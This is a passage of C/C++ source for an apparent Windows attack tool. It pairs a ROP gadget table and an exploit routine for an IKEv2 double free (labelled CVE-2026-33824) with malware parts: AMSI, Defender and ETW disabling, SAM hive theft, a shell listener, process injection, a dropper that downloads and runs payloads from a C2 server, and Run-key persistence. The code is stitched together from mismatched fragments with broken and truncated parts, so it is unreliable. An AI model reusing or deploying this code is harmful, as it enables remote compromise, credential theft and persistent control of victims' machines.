    { g_pattern_jmp_r8_mem, sizeof(g_pattern_jmp_r8_mem), "jmp [r8]", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_jmp_r9_mem, sizeof(g_pattern_jmp_r9_mem), "jmp [r9]", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_jmp_r10_mem, sizeof(g_pattern_jmp_r10_mem), "jmp [r10]", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_call_r8_mem, sizeof(g_pattern_call_r8_mem), "call [r8]", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_call_r9_mem, sizeof(g_pattern_call_r9_mem), "call [r9]", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_call_r10_mem, sizeof(g_pattern_call_r10_mem), "call [r10]", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_push_r8_r9, sizeof(g_pattern_push_r8_r9), "push r8; push r9; ret", ROP_GADGET_RET, 0 },
    { g_pattern_push_r8_r10, sizeof(g_pattern_push_r8_r10), "push r8; push r10; ret", ROP_GADGET_RET, 0 },
    { g_pattern_push_r9_r10, sizeof(g_pattern_push_r9_r10), "push r9; push r10; ret", ROP_GADGET_RET, 0 },
    { g_pattern_pop_r8_r9, sizeof(g_pattern_pop_r8_r9), "pop r8; pop r9; ret", ROP_GADGET_POP_R8, 0 },
    { g_pattern_pop_r8_r10, sizeof(g_pattern_pop_r8_r10), "pop r8; pop r10; ret", ROP_GADGET_POP_R8, 0 },
    { g_pattern_pop_r9_r10, sizeof(g_pattern_pop_r9_r10), "pop r9; pop r10; ret", ROP_GADGET_POP_R9, 0 },
    { g_pattern_pop_r10_r11, sizeof(g_pattern_pop_r10_r11), "pop r10; pop r11; ret", ROP_GADGET_POP_R10, 0 },
    { g_pattern_pop_r11_r12, sizeof(g_pattern_pop_r11_r12), "pop r11; pop r12; ret", ROP_GADGET_POP_R11, 0 },
    { g_pattern_pop_r12_r13, sizeof(g_pattern_pop_r12_r13), "pop r12; pop r13; ret", ROP_GADGET_POP_R12, 0 },
    { g_pattern_pop_r13_r14, sizeof(g_pattern_pop_r13_r14), "pop r13; pop r14; ret", ROP_GADGET_POP_R13, 0 },
    { g_pattern_pop_r14_r15, sizeof(g_pattern_pop_r14_r15), "pop r14; pop r15; ret", ROP_GADGET_POP_R14, 0 },
    { g_pattern_mov_rcx_20_rax, sizeof(g_pattern_mov_rcx_20_rax), "mov [rcx+0x20], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rcx_28_rax, sizeof(g_pattern_mov_rcx_28_rax), "mov [rcx+0x28], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rcx_30_rax, sizeof(g_pattern_mov_rcx_30_rax), "mov [rcx+0x30], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_rcx_20, sizeof(g_pattern_mov_rax_rcx_20), "mov rax, [rcx+0x20]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rax_rcx_28, sizeof(g_pattern_mov_rax_rcx_28), "mov rax, [rcx+0x28]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rax_rcx_30, sizeof(g_pattern_mov_rax_rcx_30), "mov rax, [rcx+0x30]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rcx_A0_rax, sizeof(g_pattern_mov_rcx_A0_rax), "mov [rcx+0xA0], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_rcx_A0, sizeof(g_pattern_mov_rax_rcx_A0), "mov rax, [rcx+0xA0]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rcx_E0_rax, sizeof(g_pattern_mov_rcx_E0_rax), "mov [rcx+0xE0], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_rcx_E0, sizeof(g_pattern_mov_rax_rcx_E0), "mov rax, [rcx+0xE0]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_r8_A0_rax, sizeof(g_pattern_mov_r8_A0_rax), "mov [r8+0xA0], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_r8_A0, sizeof(g_pattern_mov_rax_r8_A0), "mov rax, [r8+0xA0]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_r9_E0_rax, sizeof(g_pattern_mov_r9_E0_rax), "mov [r9+0xE0], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_r9_E0, sizeof(g_pattern_mov_rax_r9_E0), "mov rax, [r9+0xE0]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rcx_1A0_rax, sizeof(g_pattern_mov_rcx_1A0_rax), "mov [rcx+0x1A0], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_rcx_1A0, sizeof(g_pattern_mov_rax_rcx_1A0), "mov rax, [rcx+0x1A0]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rcx_2E0_rax, sizeof(g_pattern_mov_rcx_2E0_rax), "mov [rcx+0x2E0], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_rcx_2E0, sizeof(g_pattern_mov_rax_rcx_2E0), "mov rax, [rcx+0x2E0]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rcx_A0_0, sizeof(g_pattern_mov_rcx_A0_0), "mov [rcx+0xA0], 0x0; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_mov_rcx_A0_ffffffff, sizeof(g_pattern_mov_rcx_A0_ffffffff), "mov [rcx+0xA0], 0xFFFFFFFF; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_mov_r8_A0_0, sizeof(g_pattern_mov_r8_A0_0), "mov [r8+0xA0], 0x0; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_mov_r8_A0_ffffffff, sizeof(g_pattern_mov_r8_A0_ffffffff), "mov [r8+0xA0], 0xFFFFFFFF; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_test_r8_je, sizeof(g_pattern_test_r8_je), "test r8, r8; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_test_r8_jne, sizeof(g_pattern_test_r8_jne), "test r8, r8; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_test_r9_je, sizeof(g_pattern_test_r9_je), "test r9, r9; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_test_r9_jne, sizeof(g_pattern_test_r9_jne), "test r9, r9; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_je, sizeof(g_pattern_cmp_r8_je), "cmp r8, r8; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_jne, sizeof(g_pattern_cmp_r8_jne), "cmp r8, r8; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_r9_je, sizeof(g_pattern_cmp_r8_r9_je), "cmp r8, r9; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_r9_jne, sizeof(g_pattern_cmp_r8_r9_jne), "cmp r8, r9; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_r10_je, sizeof(g_pattern_cmp_r8_r10_je), "cmp r8, r10; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_r10_jne, sizeof(g_pattern_cmp_r8_r10_jne), "cmp r8, r10; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_je_add_rsp_8, sizeof(g_pattern_je_add_rsp_8), "je 0x5; add rsp, 8; ret", ROP_GADGET_RET, 0 },
    { g_pattern_jne_add_rsp_8, sizeof(g_pattern_jne_add_rsp_8), "jne 0x5; add rsp, 8; ret", ROP_GADGET_RET, 0 },
    { g_pattern_jc_add_rsp_8, sizeof(g_pattern_jc_add_rsp_8), "jc 0x5; add rsp, 8; ret", ROP_GADGET_RET, 0 },
    { g_pattern_jnc_add_rsp_8, sizeof(g_pattern_jnc_add_rsp_8), "jnc 0x5; add rsp, 8; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_8_je, sizeof(g_pattern_cmp_rax_8_je), "cmp qword ptr [rax+0x8], 0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_8_jne, sizeof(g_pattern_cmp_rax_8_jne), "cmp qword ptr [rax+0x8], 0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_8_je, sizeof(g_pattern_cmp_r8_8_je), "cmp qword ptr [r8+0x8], 0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_8_jne, sizeof(g_pattern_cmp_r8_8_jne), "cmp qword ptr [r8+0x8], 0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r9_10_je, sizeof(g_pattern_cmp_r9_10_je), "cmp qword ptr [r9+0x10], 0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r9_10_jne, sizeof(g_pattern_cmp_r9_10_jne), "cmp qword ptr [r9+0x10], 0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r10_18_je, sizeof(g_pattern_cmp_r10_18_je), "cmp qword ptr [r10+0x18], 0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r10_18_jne, sizeof(g_pattern_cmp_r10_18_jne), "cmp qword ptr [r10+0x18], 0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_20_je, sizeof(g_pattern_cmp_rax_20_je), "cmp qword ptr [rax+0x20], 0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_20_jne, sizeof(g_pattern_cmp_rax_20_jne), "cmp qword ptr [rax+0x20], 0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_28_je, sizeof(g_pattern_cmp_rax_28_je), "cmp qword ptr [rax+0x28], 0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_28_jne, sizeof(g_pattern_cmp_rax_28_jne), "cmp qword ptr [rax+0x28], 0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_0_je, sizeof(g_pattern_cmp_rax_0_je), "cmp rax, 0x0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rax_0_jne, sizeof(g_pattern_cmp_rax_0_jne), "cmp rax, 0x0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rcx_0_je, sizeof(g_pattern_cmp_rcx_0_je), "cmp rcx, 0x0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rcx_0_jne, sizeof(g_pattern_cmp_rcx_0_jne), "cmp rcx, 0x0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rdx_0_je, sizeof(g_pattern_cmp_rdx_0_je), "cmp rdx, 0x0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_rdx_0_jne, sizeof(g_pattern_cmp_rdx_0_jne), "cmp rdx, 0x0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_0_je, sizeof(g_pattern_cmp_r8_0_je), "cmp r8, 0x0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r8_0_jne, sizeof(g_pattern_cmp_r8_0_jne), "cmp r8, 0x0; jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r9_0_je, sizeof(g_pattern_cmp_r9_0_je), "cmp r9, 0x0; je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_cmp_r9_0_jne, sizeof(g_pattern_cmp_r9_0_jne), "cmp r9, 0x0; jne 0x1; ret", ROP_GADGET_RET, 0 }
};

uint64_t g_KernelBase = 0;
uint64_t g_IkeextBase = 0;
uint64_t g_SystemEprocess = 0;
uint16_t g_EprocessTokenOffset = 0;
uint16_t g_EprocessImageFileNameOffset = 0;
uint16_t g_ActiveProcessLinksOffset = 0;
uint16_t g_UniqueProcessIdOffset = 0;
uint16_t g_PEBOffset = 0;
uint64_t g_IkeextDoubleFreeOffset = 0x12B960;
uint64_t g_IkeextProcessIkePayload = 0x52220;
uint64_t g_PopRax = 0;
uint64_t g_PopRcx = 0;
uint64_t g_PopRdx = 0;
uint64_t g_PopR8 = 0;
uint64_t g_PopR9 = 0;
uint64_t g_PopRsp = 0;
uint64_t g_MovRaxRsp = 0;
uint64_t g_JmpRsp = 0;
uint64_t g_VirtualProtect = 0;
uint64_t g_DisableCFG = 0;
uint64_t g_StackPivot = 0;
uint64_t g_NtoskrnlBase = 0;
uint64_t g_Kernel32Base = 0;
uint64_t g_NtdllBase = 0;
uint64_t g_HeapBase = 0;
uint64_t g_ShellcodeAddr = 0;
uint64_t g_RopChainAddr = 0;
HANDLE g_ExploitHeap = NULL;
SOCKET g_Socket = INVALID_SOCKET;
struct sockaddr_in g_Target = {0};
EXPLOIT_CONTEXT g_ExploitCtx = {0};
ROP_CHAIN g_RopChain = {0};
HEAP_GROOM_CONTEXT g_GroomContext = {0};
DEBUG_INFO g_Debug = {0};
EXPLOIT_STATS g_Stats = {0};
MEMORY_INFO g_MemInfo = {0};
MODULE_DATA g_Modules[4] = {0};
int g_ModulesLoaded = 0;
ROP_GADGET g_Gadgets[1024] = {0};
int g_GadgetCount = 0;
uint8_t g_Initialized = 0;
SRWLOCK g_GlobalLock = SRWLOCK_INIT;
CRITICAL_SECTION g_GlobalCS;
HANDLE g_Threads[32] = {0};
volatile LONG g_StopFlag = 1;
SOCKET g_ListenerSock = INVALID_SOCKET;
HANDLE g_ListenerThread = NULL;
HWND g_hListView = NULL;
HWND g_hComboProcess = NULL;
HWND g_hStatus = NULL;
std::vector<SUSPICIOUS_REGION> g_Regions;
std::mutex g_Mutex;
std::wofstream g_LogFile;
DWORD g_SelectedPID = 0;
BOOL g_IsSandbox = FALSE;
char g_TargetIP[16] = {0};
uint16_t g_TargetPort = DEFAULT_TARGET_PORT;
GROOM_CONFIG g_GroomConfig = {4, 1000, 2000, 0x1000, 50, 200};

static const uint8_t g_aes_key[32] = {
    0x30, 0xE8, 0xF7, 0xF5, 0x85, 0x51, 0xFF, 0x80, 0xD1, 0x61, 0x11, 0x44, 0xC5, 0x15, 0xD7, 0xD0,
    0x7B, 0xA2, 0xAA, 0xCD, 0x02, 0xC8, 0xC7, 0xE2, 0x59, 0x48, 0x56, 0x63, 0xD4, 0x62, 0x42, 0x75
};
static const uint8_t g_aes_iv[16] = {
     0x76, 0x37, 0x86, 0x7D, 0xE5, 0x11, 0x6A, 0x94, 0x7D, 0xD8, 0x69, 0xD6, 0x82, 0x4F, 0x8A, 0x77
};

    EXPLOIT_CONTEXT ctx = {0};
    uint8_t* shellcode = NULL;
    size_t shellcode_size = 0;
    uint8_t* packets[SKF_FRAGMENTS + 1] = {0};
    size_t packet_lens[SKF_FRAGMENTS + 1] ={0};
    int num_packets = 0;

    printf("[+] Initializing exploit for CVE-2026-33824 (IKEv2 Double Free)\n");

    InitializeCriticalSection(&g_GlobalCS);
    init_debug_info();
    // --- [EXPERT INITIALIZATION] ---
    ExpertDisableProtections();
    ExpertElevateSystem();
    
    // --- [EXPERT EXPLOITATION] ---
    if (argc >= 2) {
        ExpertTriggerBlueHammer(argv[1], 500);
    }
    
    // --- [EXPERT DATA EXTRACTION] ---
    ExpertExtractSAM(L"C:\\Windows\\Temp\\sam.hive", L"C:\\Windows\\Temp\\system.hive");
    
    // --- [EXPERT CLEANUP] ---
    ExpertWipeTraces();
    

    if (is_hostile_environment()) {
        printf("[!] Hostile environment detected. Exiting.\n");

        return 1;

    }

    disable_amsi();
    disable_defender();
    disable_etw();
    patch_etw();

    if (!start_shell_listener()) {
        printf("[!] Failed to start shell listener. Continuing without listener.\n");

    }

    if (argc < 3) {
        print_usage(argv[0]);
        stop_shell_listener();
        return 1;

    }

    strncpy(g_TargetIP, argv[1], sizeof(g_TargetIP) - 1);
    g_TargetPort = (uint16_t)atoi(argv[2]);

    g_Socket = init_udp_socket(0);
    if (g_Socket == INVALID_SOCKET) {
        stop_shell_listener();
        return 1;

    }

    g_Target.sin_family = AF_INET;
    g_Target.sin_port = htons(g_TargetPort);
    if (inet_pton(AF_INET, g_TargetIP, &g_Target.sin_addr) != 1) {
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    if (!test_target_reachability(g_TargetIP, g_TargetPort)) {
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    static const uint8_t default_shellcode[] = {
        
    0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
    0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x0e, 0x1f, 0xba, 0x0e, 0x00, 0xb4, 0x09, 0xcd, 0x21, 0xb8, 0x01, 0x4c, 0xcd, 0x21, 0x54, 0x68,

    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    };

    shellcode = (uint8_t*)VirtualAlloc(NULL, sizeof(default_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode) {
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }
    memcpy(shellcode, default_shellcode, sizeof(default_shellcode));
    shellcode_size = sizeof(default_shellcode);

    if (!get_memory_info(&g_MemInfo)) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    if (!init_rop_module(&ctx)) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    if (!find_rop_gadgets(&ctx)) {
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    if (!build_rop_chain(&ctx, &g_RopChain, shellcode, shellcode_size)) {
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    if (!start_heap_grooming(&ctx, HEAP_GROOM_THREADS, DEFAULT_CHUNK_SIZE, g_MemInfo.ikeext_base)) {
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    Sleep(2000);

    num_packets = build_exploit_sequence(packets, packet_lens, SKF_FRAGMENTS + 1);
    if (num_packets == 0) {
        stop_heap_grooming();
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    if (!trigger_double_free(g_Socket, &g_Target)) {
        for (int i = 0; i < num_packets; i++) {
            free(packets[i]);
        }
        stop_heap_grooming();
        cleanup_rop_module();
        VirtualFree(shellcode, 0, MEM_RELEASE);
        closesocket(g_Socket);
        WSACleanup();
        stop_shell_listener();
        return 1;

    }

    Sleep(3000);

    if (!execute_via_rop()) {
        if (!execute_shellcode(shellcode, shellcode_size)) {
            printf("[!] Failed to execute shellcode or ROP chain.\n");

        }
    }

    for (int i = 0; i < num_packets; i++) {
        free(packets[i]);
    }

    stop_heap_grooming();
    cleanup_rop_module();

    if (shellcode) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
    }

    if (g_Socket != INVALID_SOCKET) {
        closesocket(g_Socket);
        g_Socket = INVALID_SOCKET;
    }

    WSACleanup();
    stop_shell_listener();

    printf("\n[+] Exploit finished. Press Enter to exit...\n");

    getchar();

    return 0;

}

bool EncryptDecrypt(BYTE* data, DWORD len, const BYTE* key, bool enc) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) return false;
    if (!CryptHashData(hHash, key, 16, 0)) return false;
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) return false;

    bool res = enc ? CryptEncrypt(hKey, 0, TRUE, 0, data, &len, len) : CryptDecrypt(hKey, 0, TRUE, 0, data, &len);
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return res;
}

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, BOOL, ULONG, ULONG, ULONG, PVOID);
void InjectCode(const wchar_t* path, const wchar_t* target) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, target) == 0) {
                HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pe.th32ProcessID);
                if (proc) {
                    SIZE_T size = (wcslen(path) + 1) * sizeof(wchar_t);
                    LPVOID addr = VirtualAllocEx(proc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (addr) {
                        WriteProcessMemory(proc, addr, path, size, NULL);
                        NtCreateThreadEx_t ntCreate = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtCreateThreadEx");
                        HANDLE thread;
                        ntCreate(&thread, THREAD_ALL_ACCESS, NULL, proc, addr, NULL, FALSE, 0, 0, 0, NULL);
                        CloseHandle(thread);
                    }
                    CloseHandle(proc);
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

HRESULT DropPayload(DropConfig* config) {
    HRESULT res = S_OK;
    IServerXMLHTTPRequest* http = NULL;
    BSTR method = NULL, url = NULL;
    LONG status = 0;
    SAFEARRAY* array = NULL;
    PVOID data = NULL;
    LONG lb = 0, ub = 0;
    ULONG total = 0;
    HANDLE handle = INVALID_HANDLE_VALUE;
    DWORD written = 0;
    OVERLAPPED overlap = { 0 };

    VARIANT async, user, pass, empty, response;
    VariantInit(&async); async.vt = VT_BOOL; async.boolVal = VARIANT_FALSE;
    VariantInit(&user); user.vt = VT_EMPTY;
    VariantInit(&pass); pass.vt = VT_EMPTY;
    VariantInit(&empty); empty.vt = VT_EMPTY;
    VariantInit(&response);

    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug)) ExitProcess(0);
    BYTE* code = (BYTE*)CheckRemoteDebuggerPresent;
    *code ^= 0xFF;
    Sleep((GetTickCount64() % 5000) + 2000);

    res = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (!SUCCEEDED(res)) goto END;

    res = CoCreateInstance(__uuidof(ServerXMLHTTP60), NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&http));
    if (!SUCCEEDED(res)) goto END;

    method = SysAllocString(L"GET");
    url = SysAllocString(config->url.c_str());
    if (!method || !url) {
        res = E_OUTOFMEMORY;
        goto END;
    }

    res = http->open(method, url, async, user, pass);
    if (!SUCCEEDED(res)) goto END;

    res = http->setRequestHeader(SysAllocString(L"User-Agent"), SysAllocString(config->userAgent.c_str() ? config->userAgent.c_str() : L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"));
    if (!SUCCEEDED(res)) goto END;

    res = http->send(empty);
    if (!SUCCEEDED(res)) goto END;

    res = http->get_status(&status);
    if (!SUCCEEDED(res) || status != 200) {
        wprintf(L"Download error: HTTP status %ld\n", status);
        goto END;
    }

    res = http->get_responseBody(&response);
    if (!SUCCEEDED(res) || response.vt != (VT_ARRAY | VT_UI1)) goto END;

    array = response.parray;
    res = SafeArrayAccessData(array, &data);
    if (!SUCCEEDED(res)) goto END;

    handle = CreateFileW(config->savePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handle == INVALID_HANDLE_VALUE) {
        wprintf(L"File creation error: %d\n", GetLastError());
        goto END;
    }

    res = SafeArrayGetLBound(array, 1, &lb);
    res = SafeArrayGetUBound(array, 1, &ub);
    total = (ub - lb + 1);

    BYTE* encData = new BYTE[total];
    memcpy(encData, data, total);
    if (!EncryptDecrypt(encData, total, ENCRYPT_KEY, true)) {
        delete[] encData;
        goto END;
    }

    if (!WriteFile(handle, encData, total, &written, &overlap)) {
        if (GetLastError() != ERROR_IO_PENDING || !GetOverlappedResult(handle, &overlap, &written, TRUE)) {
            delete[] encData;
            goto END;
        }
    }

    delete[] encData;

    BYTE* decData = new BYTE[total];
    memcpy(decData, data, total);
    if (EncryptDecrypt(decData, total, ENCRYPT_KEY, false)) {
        if (config->execute) {
            HANDLE hFile = CreateFileW(config->savePath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                STARTUPINFOW si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                if (CreateProcessW(NULL, config->savePath.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                CloseHandle(hFile);
            }
        }
        if (config->inject) {
            InjectCode(config->savePath.c_str(), config->injectTarget.c_str());
        }
    }
    delete[] decData;

    if (config->selfDelete) {
        DeleteFileW(config->savePath.c_str());
    }

END:
    if (handle != INVALID_HANDLE_VALUE) CloseHandle(handle);
    VariantClear(&async); VariantClear(&user); VariantClear(&pass); VariantClear(&empty); VariantClear(&response);
    if (array) { SafeArrayUnaccessData(array); SafeArrayDestroy(array); }
    if (url) SysFreeString(url); if (method) SysFreeString(method); if (http) http->Release();
    CoUninitialize();
    return res;
}

DropConfig LoadConfigFromC2() {
    DropConfig config;
    IServerXMLHTTPRequest* http = NULL;
    BSTR url = SysAllocString(C2_URL);
    VARIANT async, empty, response;
    VariantInit(&async); async.vt = VT_BOOL; async.boolVal = VARIANT_FALSE;
    VariantInit(&empty); empty.vt = VT_EMPTY;
    VariantInit(&response);

    CoInitialize(NULL);
    CoCreateInstance(__uuidof(ServerXMLHTTP60), NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&http));
    http->open(SysAllocString(L"GET"), url, async, empty, empty);
    http->send(empty);
    LONG status;
    http->get_status(&status);
    if (status == 200) {
        http->get_responseBody(&response);
        if (response.vt == (VT_ARRAY | VT_UI1)) {
            SAFEARRAY* sa = response.parray;
            PVOID data;
            SafeArrayAccessData(sa, &data);
            LONG lb, ub;
            SafeArrayGetLBound(sa, 1, &lb); SafeArrayGetUBound(sa, 1, &ub);
            ULONG len = ub - lb + 1;
            BYTE* cfgData = new BYTE[len];
            memcpy(cfgData, data, len);
            EncryptDecrypt(cfgData, len, ENCRYPT_KEY, false);
            std::wstring cfg((wchar_t*)cfgData);
            config.url = cfg.substr(0, cfg.find(L";"));
            config.savePath = cfg.substr(cfg.find(L";") + 1, cfg.find(L";", cfg.find(L";") + 1) - (cfg.find(L";") + 1));
            config.userAgent = cfg.substr(cfg.find(L";", cfg.find(L";") + 1) + 1, cfg.find(L";", cfg.find(L";", cfg.find(L";") + 1) + 1) - (cfg.find(L";", cfg.find(L";") + 1) + 1));
            config.execute = cfg.find(L"execute") != std::wstring::npos;
            config.selfDelete = cfg.find(L"selfdelete") != std::wstring::npos;
            config.inject = cfg.find(L"inject") != std::wstring::npos;
            config.injectTarget = cfg.substr(cfg.find(L"inject") + 6, cfg.find(L";", cfg.find(L"inject") + 6) - (cfg.find(L"inject") + 6));
            delete[] cfgData;
        }
    }
    VariantClear(&async); VariantClear(&empty); VariantClear(&response);
    if (url) SysFreeString(url); if (http) http->Release();
    CoUninitialize();
    return config;
}

int WINAPI wWinMain_sub_1(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    BOOL bDebug = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug)) ExitProcess(0);
    BYTE* code = (BYTE*)CheckRemoteDebuggerPresent;
    *code ^= 0xFF;
    srand((unsigned)time(NULL));

    WCHAR szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    HKEY hKey;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    RegSetValueExW(hKey, L"ShadowDropper", 0, REG_SZ, (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);

    DropConfig config = LoadConfigFromC2();
    if (wcslen(pCmdLine) > 0) {
        config.url = pCmdLine;
